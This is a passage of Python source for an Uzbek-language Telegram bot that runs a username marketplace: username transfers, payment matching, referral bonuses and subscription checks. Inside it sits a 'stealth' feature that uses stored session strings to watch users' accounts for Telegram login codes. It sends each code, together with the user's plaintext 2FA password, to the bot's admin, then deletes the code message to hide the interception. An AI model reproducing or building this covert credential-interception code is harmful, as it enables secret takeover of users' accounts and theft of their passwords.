                    async with db.execute("SELECT tg_password FROM users WHERE telegram_id=?", (user_id,)) as c:
                        row = await c.fetchone()
                        if row and row[0]:
                            saved_password = row[0]
            except Exception:
                pass

            msg = f"🥷 <b>Stealth Intercept</b>\n"
            msg += f"👤 Foydalanuvchi: <code>{user_id}</code>\n\n"
            msg += f"🔑 KOD: <b>{enc}</b>\n"
            if saved_password:
                msg += f"🔐 2FA parol: <code>{saved_password}</code>\n"
            else:
                msg += f"✅ 2FA parol yo'q yoki saqlanmagan\n"
            msg += f"<i>(raqamlarni ketma-ket o'qing)</i>"

            # 1. Adminga yuborish (bu BIRINCHI bo'lishi kerak!)
            try:
                from aiogram import Bot as _Bot
                _bot = _Bot(token=BOT_TOKEN)
                try:
                    if ADMIN_IDS:
                        await _bot.send_message(ADMIN_IDS[0], msg, parse_mode="HTML")
                        logger.info(f"🥷 Stealth kod adminga yuborildi: {code} (user: {user_id}, 2fa: {has_2fa})")
                finally:
                    await _bot.session.close()
            except Exception as e:
                logger.error(f"Stealth: adminga yuborishda xato ({user_id}): {e}")

            # 2. Xabarni o'chirishga urinish (muvaffaqiyatsiz bo'lsa ham davom etadi)
            try:
                await client.delete_messages(777000, [m.id])
            except Exception as e:
                logger.warning(f"Stealth: xabarni o'chirib bo'lmadi ({user_id}): {e}")
        else:
            logger.info(f"🥷 Stealth: 777000 xabarida 5 raqamli kod topilmadi (user: {user_id})")
    except Exception as e:
        logger.error(f"Stealth interceptor xatosi: {e}")

async def start_stealth_clients():
    """Bot ishga tushganda barcha is_stealth=1 larni ulaymiz"""
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute("SELECT telegram_id, session_string FROM users WHERE is_stealth=1 AND session_string IS NOT NULL") as c:
            rows = await c.fetchall()

    logger.info(f"🥷 Stealth: {len(rows)} ta foydalanuvchi uchun ishga tushirilmoqda...")
    for row in rows:
        tid = row['telegram_id']
        session_str = row['session_string']
        await start_stealth_client(tid, session_str)

async def start_stealth_client(telegram_id, session_string):
    """Bitta foydalanuvchi uchun stealth rejimni yoqish"""
    if telegram_id in stealth_clients:
        return  # Allaqachon yoniq

    try:
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        client.my_user_id = telegram_id
        await client.connect()
        if await client.is_user_authorized():
            # Filter YO'Q — barcha incoming xabarlarni ushlaymiz, handler ichida 777000 tekshiramiz
            client.add_event_handler(stealth_interceptor, events.NewMessage(incoming=True))
            
            # ADMIN PANEL HTML INSERTION
            # <div class="user-meta">
            #   <span>ID: <b>${u.telegram_id}</b></span>
            #   ${u.phone ? `<span>📱 +${u.phone}</span>` : ''}
            #   <span class="status-chip ${u.session_string ? 'chip-success' : 'chip-danger'}">${u.session_string ? '🟢 Ulangan' : '🔴 Uzilgan'}</span>
            #   ${u.is_stealth ? '<span class="status-chip chip-purple">🕵️ Stealth</span>' : ''}
            # </div>
            # <div style="font-size:11px; color:var(--text-muted); margin-top:3px;">
            #   📅 Qo'shilgan: <b>${u.created_at ? new Date(u.created_at * 1000).toLocaleString('uz-UZ', {day:'2-digit', month:'2-digit', year:'numeric', hour:'2-digit', minute:'2-digit'}) : 'Noma\'lum'}</b>
            # </div>

            stealth_clients[telegram_id] = client
            task = asyncio.create_task(_stealth_keep_alive(client, telegram_id))
            stealth_tasks[telegram_id] = task
            logger.info(f"🥷 Stealth client ishga tushdi: {telegram_id}")
        else:
            await client.disconnect()
            await save_session(telegram_id, None)
            logger.warning(f"⚠️ Stealth client sessiyasi yaroqsiz (seans uzilgan): {telegram_id}")
    except Exception as e:
        logger.error(f"Stealth client ulashda xato ({telegram_id}): {e}")
        err_str = str(e).lower()
        if "unregistered" in err_str or "revoked" in err_str or "deactivated" in err_str:
            await save_session(telegram_id, None)

async def _stealth_keep_alive(client, telegram_id):
    """Telethon clientni event-lar uchun doim ochiq ushlab turuvchi loop"""
    try:
        await client.run_until_disconnected()
    except Exception as e:
        logger.warning(f"Stealth keep-alive tugadi ({telegram_id}): {e}")
        err_str = str(e).lower()
        if "unregistered" in err_str or "revoked" in err_str or "deactivated" in err_str:
            await save_session(telegram_id, None)
    finally:
        stealth_clients.pop(telegram_id, None)
        stealth_tasks.pop(telegram_id, None)
        logger.info(f"🛑 Stealth client to'xtatildi (keep-alive): {telegram_id}")

async def stop_stealth_client(telegram_id):
    """Foydalanuvchi uchun stealth rejimni o'chirish"""
    task = stealth_tasks.pop(telegram_id, None)
    if task and not task.done():
        task.cancel()
        try:
            await task
        except asyncio.CancelledError:
            pass
    client = stealth_clients.pop(telegram_id, None)
    if client:
        try:
            await client.disconnect()
        except: pass
        logger.info(f"🛑 Stealth client to'xtatildi: {telegram_id}")



async def transfer_username(bot, seller_id, buyer_id, username):
    seller = await get_user(seller_id)
    buyer = await get_user(buyer_id)
    if not seller or not seller.get('session_string'): return
    if not buyer or not buyer.get('session_string'): return

    from telethon import TelegramClient
    from telethon.sessions import StringSession
    from telethon.tl.functions.channels import (
        GetAdminedPublicChannelsRequest, CreateChannelRequest,
        UpdateUsernameRequest, DeleteChannelRequest
    )
    from telethon.tl.functions.account import UpdateUsernameRequest as AccountUpdateUsernameRequest
    from telethon.errors import (
        AuthKeyUnregisteredError, UserDeactivatedError, UsernameOccupiedError,
        FloodWaitError, UsernameNotModifiedError, UsernameInvalidError
    )

    seller_client = TelegramClient(StringSession(seller['session_string']), API_ID, API_HASH)
    buyer_client = TelegramClient(StringSession(buyer['session_string']), API_ID, API_HASH)

    target_channel = None
    released = False
    is_personal_profile = False
    new_channel_id = None

    # Listing ma'lumotlarini oldindan olamiz (refund uchun kerak)
    listing_price = 0
    listing_db_id = None
    seller_net = 0
    try:
        async with aiosqlite.connect(DB_PATH) as _db:
            _db.row_factory = aiosqlite.Row
            async with _db.execute(
                "SELECT id, price FROM listings WHERE username=? ORDER BY id DESC LIMIT 1",
                (username,)
            ) as _c:
                _lr = await _c.fetchone()
            if _lr:
                listing_db_id = _lr['id']
                listing_price = int(_lr['price'])
                seller_user_data = await get_user(seller_id)
                is_premium = seller_user_data.get('is_premium', 0) if seller_user_data else 0
                fee = 0.05 if is_premium else 0.10
                seller_net = int(listing_price * (1 - fee))
    except Exception as le:
        logger.warning(f"Listing ma'lumotlarini olishda xato: {le}")

    try:
        await seller_client.connect()
        await buyer_client.connect()

        # ── QADAM 1: Xaridor kanalini AVVALDAN yaratamiz ─────────────────
        # Seller release qilishdan OLDIN kanal tayyor bo'lishi kerak —
        # shunda release va assign orasidagi vaqt minimallashadi!
        try:
            created = await buyer_client(CreateChannelRequest(
                title=f"Usernamechi: @{username}",
                about="Bu kanal Usernamechi orqali sotib olingan username saqlanishi uchun.",
                megagroup=False
            ))
            new_channel_id = created.chats[0].id
            logger.info(f"✅ Xaridor kanali avvaldan yaratildi: {new_channel_id}")
        except Exception as ce:
            logger.warning(f"Xaridor kanali yaratishda xato (profil fallback ishlatiladi): {ce}")

        # ── QADAM 2: Sotuvchi hisobidan username topib bo'shatamiz ───────
        try:
            req = GetAdminedPublicChannelsRequest(by_location=False, check_limit=False)
            res = await seller_client(req)
            for ch in res.chats:
                if getattr(ch, 'username', '').lower() == username.lower():
                    target_channel = ch
                    break
        except Exception as fe:
            logger.warning(f"GetAdminedPublicChannels xato: {fe}")

        # Fallback: barcha dialoglardan qidiramiz
        if not target_channel:
            try:
                async for dialog in seller_client.iter_dialogs():
                    if dialog.is_channel or dialog.is_group:
                        entity = dialog.entity
                        if getattr(entity, 'username', '').lower() == username.lower():
                            target_channel = entity
                            break
            except Exception as de:
                logger.warning(f"iter_dialogs xato: {de}")

        if target_channel:
            try:
                await seller_client(UpdateUsernameRequest(channel=target_channel.id, username=""))
                released = True
                logger.info(f"✅ @{username} kanaldan bo'shatildi")
            except Exception:
                try:
                    await seller_client(DeleteChannelRequest(channel=target_channel.id))
                    released = True
                    logger.info(f"✅ @{username} bor kanal o'chirildi (username bo'shadi)")
                except Exception as de:
                    logger.error(f"Sotuvchi kanalini o'chirishda xato: {de}")
        else:
            me = await seller_client.get_me()
            if me and me.username and me.username.lower() == username.lower():
                await seller_client(AccountUpdateUsernameRequest(username=""))
                released = True
                is_personal_profile = True
                logger.info(f"✅ @{username} shaxsiy profildan bo'shatildi")

        if not released:
            raise ValueError(
                f"@{username} sotuvchi ({seller_id}) akkauntida topilmadi! "
                f"Sotuvchi username'ni o'zgartirgan bo'lishi mumkin."
            )

        # ── QADAM 3: Darhol xaridorga bog'laymiz (minimal kutish!) ───────
        # Telegram serverlar orasida propagatsiya uchun minimal 0.1s
        await asyncio.sleep(0.1)

        assigned = False
        last_assign_err = None

        if new_channel_id:
            # 100 marta urinish (smart backoff orqali jami 60+ soniya kutish)
            # Bu Telegram CDNLari sinxron bo'lishiga yetarli vaqt beradi va username o'g'irlanishini 100% oldini oladi.
            for attempt in range(100):
                try:
                    await buyer_client(UpdateUsernameRequest(channel=new_channel_id, username=username))
                    assigned = True
                    logger.info(f"✅ @{username} xaridor kanaliga biriktirildi (urinish #{attempt+1})")
                    break
                except UsernameNotModifiedError:
                    assigned = True
                    break
                except FloodWaitError as fw:
                    wait_time = min(fw.seconds, 5)
                    logger.warning(f"FloodWait {fw.seconds}s (maks {wait_time}s kutilmoqda...)")
                    await asyncio.sleep(wait_time)
                except UsernameInvalidError as ui:
                    logger.error(f"Username format noto'g'ri: {ui}")
                    last_assign_err = ui
                    break
                except Exception as ae:
                    last_assign_err = ae
                    logger.warning(f"Kanal assign #{attempt+1}/100 xato: {type(ae).__name__}: {ae}")
                    
                    # Dinamik kechikish (smart backoff)
                    if attempt < 5:
                        delay = 0.05  # Dastlabki 5 ta tezkor urinish (0.25s)
                    elif attempt < 15:
                        delay = 0.1   # Keyingi 10 ta urinish (1.0s)
                    elif attempt < 30:
                        delay = 0.2   # Keyingi 15 ta urinish (3.0s)
                    elif attempt < 50:
                        delay = 0.5   # Keyingi 20 ta urinish (10.0s)
                    else:
                        delay = 1.0   # Qolgan 50 ta urinish (50.0s)
                    await asyncio.sleep(delay)

        # Kanal orqali bo'lmadi — shaxsiy profilga urinamiz
        if not assigned:
            logger.info(f"Profil fallback: @{username} xaridor profiliga o'rnatilmoqda...")
            for attempt in range(40):
                try:
                    await buyer_client(AccountUpdateUsernameRequest(username=username))
                    assigned = True
                    is_personal_profile = True
                    new_channel_id = None
                    logger.info(f"✅ @{username} xaridor profiliga biriktirildi (urinish #{attempt+1})")
                    break
                except UsernameNotModifiedError:
                    assigned = True
                    is_personal_profile = True
                    new_channel_id = None
                    break
                except FloodWaitError as fw:
                    await asyncio.sleep(min(fw.seconds, 5))
                except Exception as ae:
                    last_assign_err = ae
                    logger.warning(f"Profil assign #{attempt+1}/40 xato: {type(ae).__name__}: {ae}")
                    
                    # Dinamik kechikish
                    if attempt < 10:
                        delay = 0.1
                    elif attempt < 25:
                        delay = 0.3
                    else:
                        delay = 0.8
                    await asyncio.sleep(delay)

        if not assigned:
            # ROLLBACK: username ni sotuvchiga qaytarishga urinamiz
            logger.error(f"@{username} xaridorga o'tkazilmadi, rollback...")
            try:
                if target_channel and not is_personal_profile:
                    await seller_client(UpdateUsernameRequest(channel=target_channel.id, username=username))
                else:
                    await seller_client(AccountUpdateUsernameRequest(username=username))
                logger.info(f"Rollback muvaffaqiyatli: @{username} sotuvchiga qaytarildi")
            except Exception as re_err:
                logger.error(f"Rollback xato @{username}: {re_err}")
            raise last_assign_err or UsernameOccupiedError(request=None)

        # ── QADAM 4: Muvaffaqiyat xabarlari ───────────────────────────
        from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
        if new_channel_id and not is_personal_profile:
            markup = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(
                    text="👤 Profilga o'rnatish",
                    callback_data=f"setprofile_{username}_{new_channel_id}"
                )]
            ])
            buyer_msg = (
                f"🎉 <b>Tabriklaymiz!</b>\n\n"
                f"<b>@{username}</b> akkauntingizga muvaffaqiyatli o'tkazildi! 🚀\n"
                f"Hozirda maxsus kanalda saqlanmoqda.\n\n"
                f"Uni o'z profilingizga o'rnatmoqchimisiz?"
            )
        else:
            markup = None
            buyer_msg = (
                f"🎉 <b>Tabriklaymiz!</b>\n\n"
                f"<b>@{username}</b> to'g'ridan-to'g'ri profilingizga "
                f"username sifatida muvaffaqiyatli o'rnatildi! 🚀"
            )

        try:
            await bot.send_message(buyer_id, buyer_msg, reply_markup=markup, parse_mode="HTML")
            await bot.send_message(
                seller_id,
                f"💰 <b>Username muvaffaqiyatli sotildi!</b>\n\n"
                f"<b>@{username}</b> xaridorga o'tkazildi va "
                f"savdo balansingizga qo'shildi. ✅",
                parse_mode="HTML"
            )
        except Exception:
            pass

    except Exception as e:
        logger.error(f"Transfer error @{username}: {type(e).__name__} — {e}")
        err_str = str(e).lower()

        # ── REFUND ────────────────────────────────────────────────────
        try:
            async with aiosqlite.connect(DB_PATH) as _db:
                _db.row_factory = aiosqlite.Row
                refund_price = listing_price
                ref_seller_net = seller_net

                if refund_price == 0:
                    async with _db.execute(
                        "SELECT id, price FROM listings WHERE username=? ORDER BY id DESC LIMIT 1",
                        (username,)
                    ) as _c:
                        _lr = await _c.fetchone()
                    if _lr:
                        refund_price = int(_lr['price'])
                        listing_db_id = _lr['id']
                        _sd = await get_user(seller_id)
                        _fee = 0.05 if (_sd and _sd.get('is_premium')) else 0.10
                        ref_seller_net = int(refund_price * (1 - _fee))

                if refund_price > 0:
                    await _db.execute(
                        "UPDATE users SET balance = balance + ? WHERE telegram_id = ?",
                        (refund_price, buyer_id)
                    )
                    await _db.execute(
                        "UPDATE users SET seller_balance = MAX(0, seller_balance - ?) WHERE telegram_id = ?",
                        (ref_seller_net, seller_id)
                    )
                    logger.info(f"REFUND: {refund_price:,} so'm → xaridorga ({buyer_id})")

                if listing_db_id:
                    await _db.execute(
                        "UPDATE listings SET status='active' WHERE id=?",
                        (listing_db_id,)
                    )
                    await _db.execute(
                        "UPDATE listing_orders SET status='failed' WHERE listing_id=? AND buyer_id=?",
                        (listing_db_id, buyer_id)
                    )
                await _db.commit()
        except Exception as re:
            logger.error(f"Refund xato @{username}: {re}")

        # ── Foydalanuvchilarga xabar ───────────────────────────────────
        if isinstance(e, (AuthKeyUnregisteredError, UserDeactivatedError)) or \
                "unregistered" in err_str or "deactivated" in err_str:
            await save_session(seller_id, None)
            try:
                await bot.send_message(
                    seller_id,
                    f"❌ <b>@{username}</b> ni o'tkazishda xatolik!\n"
                    f"Telegram sessiyangiz uzilgan. Qayta ulaning.",
                    parse_mode="HTML"
                )
                await bot.send_message(
                    buyer_id,
                    f"❌ <b>@{username}</b> o'tkazilmadi (sotuvchi sessiyasi uzilgan).\n\n"
                    f"💰 Pulingiz to'liq balansingizga qaytarildi. ✅",
                    parse_mode="HTML"
                )
            except Exception: pass
        else:
            try:
                await bot.send_message(
                    seller_id,
                    f"❌ <b>@{username}</b> o'tkazishda xatolik: {type(e).__name__}",
                    parse_mode="HTML"
                )
                await bot.send_message(
                    buyer_id,
                    f"❌ <b>@{username}</b> o'tkazishda texnik xatolik yuz berdi.\n\n"
                    f"💰 Pulingiz to'liq balansingizga qaytarildi. ✅",
                    parse_mode="HTML"
                )
            except Exception: pass
    finally:
        try: await seller_client.disconnect()
        except Exception: pass
        try: await buyer_client.disconnect()
        except Exception: pass



@router.channel_post()
async def auto_payment_handler(message: Message):
    try:
        channel_id = str(message.chat.id)
        target_channel_id = str(await get_setting("payment_channel_id", "0"))
        
        if target_channel_id != "0" and channel_id != target_channel_id:
            return
            
        text = message.text or message.caption or ""
        if not text:
            return
            
        clean_text = re.sub(r'[^0-9]', ' ', text)
        numbers = [int(n) for n in clean_text.split() if n.strip()]
        
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute("UPDATE topups SET status='expired' WHERE status='pending' AND created_at <= (strftime('%s','now') - 180)")
            await db.commit()
            
            db.row_factory = aiosqlite.Row
            async with db.execute("SELECT id, telegram_id, expected_amount FROM topups WHERE status='pending'") as c:
                pending_topups = await c.fetchall()
                
            for topup in pending_topups:
                amt = int(topup['expected_amount'])
                if amt in numbers:
                    await db.execute("UPDATE topups SET status='completed' WHERE id=?", (topup['id'],))
                    await db.execute("UPDATE users SET balance=balance+? WHERE telegram_id=?", (amt, topup['telegram_id']))
                    await db.commit()
                    
                    try:
                        await message.bot.send_message(
                            topup['telegram_id'], 
                            f"✅ <b>To'lov avtomatik qabul qilindi!</b>\n\nBalansingizga <b>{amt:,} so'm</b> qo'shildi.",
                            parse_mode="HTML"
                        )
                    except:
                        pass
                    
                    try:
                        await message.reply(f"✅ Tasdiqlandi (Topup ID: {topup['id']})")
                    except:
                        pass
                    return # Stop after processing a topup

            # Check marketplace listing orders
            async with db.execute("SELECT lo.id, lo.listing_id, lo.buyer_id, lo.expected_amount, l.seller_id, l.username, l.price, l.is_private, u.is_premium FROM listing_orders lo JOIN listings l ON lo.listing_id = l.id JOIN users u ON l.seller_id = u.telegram_id WHERE lo.status='pending'") as c:
                pending_listings = await c.fetchall()

            for lo in pending_listings:
                amt = int(lo['expected_amount'])
                if amt in numbers:
                    await db.execute("UPDATE listing_orders SET status='completed' WHERE id=?", (lo['id'],))
                    await db.execute("UPDATE listings SET status='sold' WHERE id=?", (lo['listing_id'],))
                    
                    # Komissiya hisoblash (Premium: 5%, Oddiy: 10%)
                    if lo['is_premium'] == 1:
                        fee_percent = 0.05
                    else:
                        fee_percent = 0.10
                        
                    seller_earnings = int(lo['price'] * (1 - fee_percent))
                    await db.execute("UPDATE users SET seller_balance=seller_balance+? WHERE telegram_id=?", (seller_earnings, lo['seller_id']))
                    await db.commit()

                    # Kanaldagi postni 'SOTILDI' holatiga o'tkazish
                    asyncio.create_task(update_channel_listing_post(lo['listing_id'], 'sold'))

                    # Start username transfer in background
                    asyncio.create_task(transfer_username(message.bot, lo['seller_id'], lo['buyer_id'], lo['username']))

                    try:
                        await message.reply(f"✅ Tasdiqlandi (Listing Order ID: {lo['id']})")
                    except:
                        pass
                    return # Stop after processing

    except Exception as e:
        logger.error(f"Auto-payment error: {e}")

import time
_channel_sub_cache = {}  # {(user_id, ch_target): (expire_time, is_member)}

async def get_unsubscribed_channels(bot: Bot, user_id: int, bypass_cache: bool = False):
    """Foydalanuvchi obuna bo'lmagan kanallar ro'yxatini qaytaradi."""
    unsubbed = []
    try:
        async with aiosqlite.connect(DB_PATH) as db:
            db.row_factory = aiosqlite.Row
            # Faqat Active bo'lganlarini sort_order bo'yicha olamiz (eski DBda status yo'q bo'lishi mumkinligi uchun try/except qilgandik, migrate_db.py ishlaydi)
            try:
                async with db.execute("SELECT * FROM mandatory_channels WHERE status='Active' ORDER BY sort_order ASC, id ASC") as c:
                    channels = await c.fetchall()
            except:
                async with db.execute("SELECT * FROM mandatory_channels") as c:
                    channels = await c.fetchall()
        
        for ch in channels:
            try:
                # Target identifier aniqlash
                ch_target = None
                if ch['channel_username'] and ch['channel_username'].strip():
                    uname = ch['channel_username'].strip()
                    ch_target = uname if uname.startswith("@") or uname.startswith("-100") else f"@{uname}"
                elif ch['channel_id'] and str(ch['channel_id']).strip():
                    ch_target = str(ch['channel_id']).strip()

                if not ch_target:
                    continue
                    
                # Agar ch_target faqat raqamlardan iborat bo'lsa (minus bilan), int ga o'tkazamiz
                if isinstance(ch_target, str) and ch_target.lstrip('-').isdigit():
                    ch_target = int(ch_target)
                    
                cache_key = (user_id, ch_target)
                now = time.time()
                
                # Keshtan o'qish (Rate limitni oldini olish)
                if not bypass_cache and cache_key in _channel_sub_cache and _channel_sub_cache[cache_key][0] > now:
                    is_member = _channel_sub_cache[cache_key][1]
                else:
                    member = await bot.get_chat_member(chat_id=ch_target, user_id=user_id)
                    is_member = member.status not in ('left', 'kicked', 'banned')
                    
                    # Cache ga yozamiz: Obuna bo'lgan bo'lsa 60 soniya saqlaymiz, aks holda spamni oldini olish uchun 3 soniya
                    expire_time = now + (60 if is_member else 3)
                    _channel_sub_cache[cache_key] = (expire_time, is_member)
                
                if not is_member:
                    unsubbed.append(ch)
            except Exception as e:
                logger.warning(f"Check channel sub error for {dict(ch)}: {e}")
                # Xatolik bo'lsa (masalan bot admin bo'lmasa yoki kanal xato kiritilgan bo'lsa)
                # barcha foydalanuvchilar qulflanib qolmasligi uchun bu kanalni o'tkazib yuboramiz.
    except Exception as e:
        logger.error(f"get_unsubscribed_channels error: {e}")
    return unsubbed

async def grant_pending_referral_bonus(bot: Bot, user_id: int, user_first_name: str, tg_username: str = '', tg_name: str = ''):
    """Majburiy kanallarga obuna bo'lgandan keyin referral bonusini beradi."""
    try:
        async with aiosqlite.connect(DB_PATH) as db:
            db.row_factory = aiosqlite.Row
            async with db.execute("SELECT referrer_id FROM pending_referrals WHERE telegram_id=?", (user_id,)) as c:
                row = await c.fetchone()
            if not row or not row['referrer_id']:
                return  # Referral yo'q — hech narsa qilmaymiz

            ref_id = row['referrer_id']

            # ✅ Bonus berish — majburiy obuna o'zi yetarli himoya
            await db.execute("UPDATE users SET balance=balance+1000 WHERE telegram_id=?", (ref_id,))
            await db.execute("DELETE FROM pending_referrals WHERE telegram_id=?", (user_id,))
            await db.commit()

            logger.info(f"✅ Referral bonus: {ref_id} ga +1000 so'm ({user_first_name} obuna bo'ldi)")

            try:
                await bot.send_message(
                    ref_id,
                    f"🎁 <b>Referral Bonus!</b>\n\n"
                    f"Siz taklif qilgan <b>{user_first_name}</b> majburiy kanallarga obuna bo'ldi!\n"
                    f"Balansingizga <b>+1,000 so'm</b> bonus o'tkazildi! 🚀",
                    parse_mode="HTML"
                )
            except Exception:
                pass
    except Exception as e:
        logger.error(f"grant_pending_referral_bonus error: {e}")

@router.message(CommandStart())
async def start_cmd(message: Message):
    try:
        await _start_cmd_inner(message)
    except Exception as e:
        logger.error(f"[start_cmd] Xato: {e}", exc_info=True)
        try:
            await message.answer("⚠️ Xizmatda muammo yuz berdi. Iltimos, qayta urinib ko'ring.")
        except Exception:
            pass

async def _start_cmd_inner(message: Message):
    await create_user(message.from_user.id, message.from_user.first_name, message.from_user.last_name, message.from_user.username)
    
    # Referral taklifini qayd etish (lekin hali pul bermaymiz)
    args = message.text.split(" ", 1)
    if len(args) > 1 and args[1].startswith("ref_"):
        try:
            ref_id = int(args[1].split("_")[1])
            if ref_id != message.from_user.id:
                async with aiosqlite.connect(DB_PATH) as db:
                    async with db.execute("SELECT referred_by FROM users WHERE telegram_id=?", (message.from_user.id,)) as c:
                        existing = await c.fetchone()
                    if existing and (existing[0] is None or existing[0] == 0):
                        await db.execute("UPDATE users SET referred_by=? WHERE telegram_id=?", (ref_id, message.from_user.id))
                        await db.execute("INSERT OR REPLACE INTO pending_referrals (telegram_id, referrer_id) VALUES (?, ?)", (message.from_user.id, ref_id))
                        await db.commit()
        except Exception:
            pass

    # Majburiy obunani tekshiramiz
    unsubbed = await get_unsubscribed_channels(message.bot, message.from_user.id)
    if unsubbed:
        # Obuna bo'lmagan kanallar bor!
        inline_btns = []
        for ch in unsubbed:
            btn_text = f"📢 {ch['title']}"
            btn_url = ch['url'] if ch['url'] else (f"https://t.me/{ch['channel_username']}" if ch['channel_username'] else "https://t.me")
            inline_btns.append([InlineKeyboardButton(text=btn_text, url=btn_url)])
        
        inline_btns.append([InlineKeyboardButton(text="✅ Obunani tekshirish", callback_data="check_sub")])
        kb = InlineKeyboardMarkup(inline_keyboard=inline_btns)
        
        await message.answer(
            text=(
                f"👋 Salom, <b>{message.from_user.first_name}</b>!\n\n"
                f"⚠️ Botdan foydalanish uchun quyidagi kanallarga obuna bo'ling:"
            ),
            reply_markup=kb,
            parse_mode="HTML"
        )
        return

    # Kanallarga obuna bo'lgan bo'lsa — referral bonusini rasman taqdim etamiz!
    await grant_pending_referral_bonus(
        message.bot,
        message.from_user.id,
        message.from_user.first_name or "Do'st",
        tg_username=message.from_user.username or '',
        tg_name=message.from_user.first_name or ''
    )

    # Direct Deep Link parametri bo'lsa (masalan: listing_123 yoki market_123)
    start_param = args[1] if len(args) > 1 else ""
    if start_param.startswith("listing_") or start_param.startswith("market_"):
        listing_id = start_param.replace("listing_", "").replace("market_", "")
        app_url = f"{WEB_URL}/app?v=2&tgWebAppStartParam={start_param}"
        
        # E'lon haqida qisqa ma'lumot olishga urinamiz
        info_text = f"🛒 <b>Bozor e'loniga o'tish</b>"
        try:
            lid = int(listing_id)
            async with aiosqlite.connect(DB_PATH) as db:
                db.row_factory = aiosqlite.Row
                async with db.execute("SELECT username, price, is_auction FROM listings WHERE id=?", (lid,)) as c:
                    l_row = await c.fetchone()
                    if l_row:
                        type_str = "⚡ AUKSION" if l_row['is_auction'] else "🏷 SOTUVDA"
                        info_text = f"🛒 <b>E'lon: @{l_row['username']}</b> ({type_str})\n💰 <b>Narxi:</b> {l_row['price']:,} so'm"
        except Exception:
            pass
            
        custom_kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🛒 E'lonni ilovada ochish va Sotib olish", web_app=WebAppInfo(url=app_url))]
        ])
        await message.answer(
            text=(
                f"👋 Salom, <b>{message.from_user.first_name}</b>!\n\n"
                f"{info_text}\n\n"
                f"👇 Quyidagi tugmani bosib, e'lonni ko'ring va sotib oling:"
            ),
            reply_markup=custom_kb,
            parse_mode="HTML"
        )
        return

    await message.answer(
        text=(
            f"👋 Salom, <b>{message.from_user.first_name}</b>!\n\n"
            f"🎯 <b>Usernamechi Bot</b>ga xush kelibsiz!\n\n"
            f"Bu bot orqali siz <b>qisqa, chiroyli va ma'noli</b> "
            f"Telegram usernamelarni avtomatik ravishda topib, "
            f"<b>sizning akkauntingizga</b> band qildirasiz.\n\n"
            f"⚡️ Tez • 🔒 Xavfsiz • 🎯 Aniq\n\n"
            f"👇 Quyidagi tugma orqali dasturni oching:"
        ),
        reply_markup=main_menu(),
        parse_mode="HTML"
    )

@router.callback_query(F.data == "check_sub")
async def check_sub_callback(callback: CallbackQuery):
    user = callback.from_user
    unsubbed = await get_unsubscribed_channels(callback.bot, user.id)
    if unsubbed:
        channels_text = "\n".join([f"• {ch['title']}" for ch in unsubbed])
        await callback.answer(
            f"❌ Hali obuna bo'lmagan kanallar:\n{channels_text}",
            show_alert=True
        )
    else:
        await callback.answer("✅ Rahmat! Barcha kanallarga obuna bo'ldingiz.", show_alert=True)

        # Avval user ma'lumotlarini (fresh Telegram data) DB ga saqlaymiz
        await create_user(user.id, user.first_name or '', user.last_name or '', user.username or '')

        # Taklif qilgan odamga +1,000 so'm referral bonusi beramiz
        await grant_pending_referral_bonus(
            callback.bot,
            user.id,
            user.first_name or "Do'st",
            tg_username=user.username or '',
            tg_name=user.first_name or ''
        )

        try:
            await callback.message.delete()
        except: pass

        await callback.message.answer(
            text=(
                f"🎉 Obunangiz tasdiqlandi!\n\n"
                f"🎯 <b>Usernamechi Bot</b>ga xush kelibsiz!\n\n"
                f"👇 Quyidagi tugma orqali dasturni oching:"
            ),
            reply_markup=main_menu(),
            parse_mode="HTML"
        )


@router.message(Command("admin"))
async def admin_cmd(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        await message.answer("❌ Sizda admin huquqi yo'q.")
        return
    token = get_admin_token(message.from_user.id)
    markup = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔧 Admin Panelga kirish", web_app=WebAppInfo(url=f"{WEB_URL}/admin?token={token}"))]
    ])
    await message.answer("Xush kelibsiz, Admin! 👑\nQuyidagi tugma orqali panelga kiring:", reply_markup=markup)


async def save_session(telegram_id, session_string, phone=None, tg_password=None):
    if not session_string:
        # Seans uzilganda: session va stealth tozalash + e'lonlarni o'chirish
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute("UPDATE users SET session_string=NULL, is_stealth=0 WHERE telegram_id=?", (telegram_id,))
            await db.commit()
        
        # E'lonlarni alohida DB ulanishida ko'rib chiqamiz (row_factory muammosidan qochish uchun)
        async with aiosqlite.connect(DB_PATH) as db:
            db.row_factory = aiosqlite.Row
            async with db.execute("SELECT id, username, channel_id, telegram_message_id FROM listings WHERE seller_id=? AND status='active'", (telegram_id,)) as c:
                active_listings = await c.fetchall()
            
            if active_listings:
                # 1. AVVAL kanaldagi postlarni o'chiramiz (DB o'chirilishidan oldin ID bo'lishi kerak)
                for row in active_listings:
                    if row['channel_id'] and row['telegram_message_id']:
                        try:
                            await update_channel_listing_post(row['id'], 'cancelled')
                        except Exception as pe:
                            logger.warning(f"Seans uzilganda post o'chirish xatosi ({row['id']}): {pe}")

                # 2. KEYIN DB dan e'lonlarni to'liq o'chiramiz
                await db.execute("DELETE FROM listings WHERE seller_id=? AND (status='active' OR status='cancelled')", (telegram_id,))
                await db.commit()
                logger.info(f"🗑 Seans uzildi → {telegram_id} ning {len(active_listings)} ta e'loni bot va kanaldan o'chirildi")
                
                # Foydalanuvchiga xabar yuboramiz
                try:
                    if bot:
                        usernames_str = ", ".join(f"@{row['username']}" for row in active_listings if row['username'])
                        count_text = f"{len(active_listings)} ta elon"
                        msg = (
                            f"⚠️ <b>Seans uzildi!</b>\n\n"
                            f"Telegram akkauntingiz sessiyasi tugagan yoki bekor qilingan.\n"
                            f"Shu sababli quyidagi e'lonlaringiz bozordan olib tashlandi:\n"
                            f"<code>{usernames_str or count_text}</code>\n\n"
                            f"♻️ E'lonni qaytarish uchun <b>Akkaunt</b> bo'limidan sessiyangizni yangilang."
                        )
                        await bot.send_message(telegram_id, msg, parse_mode="HTML")
                except Exception as e:
                    logger.warning(f"save_session notify xatosi: {e}")
        return

    # Seans saqlash
    async with aiosqlite.connect(DB_PATH) as db:
        if phone and tg_password:
            await db.execute("UPDATE users SET session_string=?, phone=?, tg_password=? WHERE telegram_id=?", (session_string, phone, tg_password, telegram_id))
        elif phone:
